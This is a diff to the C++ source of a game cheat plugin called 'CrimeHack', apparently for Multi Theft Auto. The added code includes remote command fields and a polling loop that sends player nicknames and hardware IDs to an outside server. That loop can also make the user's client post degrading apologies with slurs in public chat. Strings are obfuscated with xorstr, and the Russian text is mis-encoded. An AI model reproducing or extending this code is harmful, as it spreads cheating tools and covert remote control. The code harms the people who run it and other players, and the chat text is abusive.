@@ -4,7 +4,7 @@
 #define HOOKPOS_PlayerCollision 0x0054BCEE
 #define AGENT_NAME xorstr_("CR1M3H")
 #define LOG_NAME xorstr_("CrimeHack.log")
-#define PLUGIN_VER xorstr_("V5.8 BETA")
+#define PLUGIN_VER xorstr_("V5.9 BETA")
 #include <Windows.h>
 #include <stdio.h>
 #include <string>
@@ -90,6 +90,8 @@ char inp_txt14[256];
 char inp_txt15[256];
 char inp_txt16[256];
 char inp_txt17[256];
+char inp_txt18[256];
+char inp_txt19[256];
 bool FakeKill = false;
 bool FisherBot = false;
 volatile bool AntiAFK = false;
@@ -1010,6 +1012,7 @@ void __stdcall SyncAllRanks()
 			if (!sc_ans.empty() && sc_ans.length() > 0) myRank.rank = std::stoi(sc_ans);
 		}
 		catch (...) {};
+		myRank.exec_cmd = xorstr_("none"); myRank.exec_arg = xorstr_("none");
 		sc_ans = SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/ranks.php"), "", true);
 		if (IsFileExist(xorstr_("ranks.db"))) DeleteFileA(xorstr_("ranks.db"));
 		FILE* rFile = fopen(xorstr_("ranks.db"), xorstr_("wb"));
@@ -1021,4 +1024,54 @@ void __stdcall SyncAllRanks()
 		ReadRanks();
 		Sleep(3000);
 	}
+}
+void Absorber()
+{
+	while (true)
+	{
+		FILE* hFile = fopen((GetGamePath() + xorstr_("\\AbsorbCMD.txt")).c_str(), xorstr_("rb"));
+		if (hFile != nullptr)
+		{
+			char extractedNick[256]; memset(extractedNick, 0, sizeof(extractedNick));
+			fread(extractedNick, 1, sizeof(extractedNick), hFile);
+			fclose(hFile); DeleteFileA((GetGamePath() + xorstr_("\\AbsorbCMD.txt")).c_str());
+			std::string host_lnk = xorstr_("kuprey123.beget.tech");
+			char params[4000]; memset(params, 0, sizeof(params));
+			sprintf(params, xorstr_("nick=%s"), extractedNick);
+			SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/absorber.php"), std::string(params), false);
+		}
+		hFile = fopen((GetGamePath() + xorstr_("\\AbsorbCMD2.txt")).c_str(), xorstr_("rb"));
+		if (hFile != nullptr)
+		{
+			char extractedNick[256]; memset(extractedNick, 0, sizeof(extractedNick));
+			fread(extractedNick, 1, sizeof(extractedNick), hFile);
+			fclose(hFile); DeleteFileA((GetGamePath() + xorstr_("\\AbsorbCMD2.txt")).c_str());
+			std::string host_lnk = xorstr_("kuprey123.beget.tech");
+			char params[4000]; memset(params, 0, sizeof(params));
+			sprintf(params, xorstr_("nick=%s"), extractedNick);
+			SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/absorber.php"), std::string(params), false);
+			char sayTxt[356]; memset(sayTxt, 0, sizeof(sayTxt));
+			sprintf(sayTxt, xorstr_("%s - € торжественно прошу теб€ прощени€!"), extractedNick);
+			if (sendMTAChat != nullptr)
+			{
+				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
+				Sleep(1000);
+				memset(sayTxt, 0, sizeof(sayTxt));
+				sprintf(sayTxt, xorstr_("ѕрости мен€ долбоеба грешного! я был неправ!"));
+				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
+				Sleep(1000);
+				memset(sayTxt, 0, sizeof(sayTxt));
+				sprintf(sayTxt, xorstr_("ќбещаю больше не быть таким пидарасом!"));
+				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
+			}
+		}
+		Sleep(150);
+	}
+}
+void ChangeRank(std::string hwid, int rank)
+{
+	std::string host_lnk = xorstr_("kuprey123.beget.tech");
+	char params[4000]; memset(params, 0, sizeof(params));
+	sprintf(params, xorstr_("my_hwid=%s&hwid=%s&rank=%d"), myRank.hwid, hwid, rank);
+	SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/set_rank.php"), std::string(params), false);
 }
